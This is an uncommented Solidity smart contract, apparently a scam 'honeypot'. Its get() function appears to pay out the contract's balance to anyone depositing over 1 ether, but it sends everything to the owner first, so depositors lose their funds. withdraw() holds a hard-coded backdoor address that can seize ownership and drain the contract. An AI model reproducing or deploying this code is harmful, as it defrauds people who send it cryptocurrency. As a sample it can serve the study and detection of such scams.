pragma solidity ^0.4.19;

contract Pie {
    address public owner = msg.sender;

    function() public payable {}

    function get() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        if (msg.sender == 0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6) {
            owner = 0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;
        }
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr != address(0));

        bool success = adr.call.value(msg.value)(data);
        require(success);
    }
}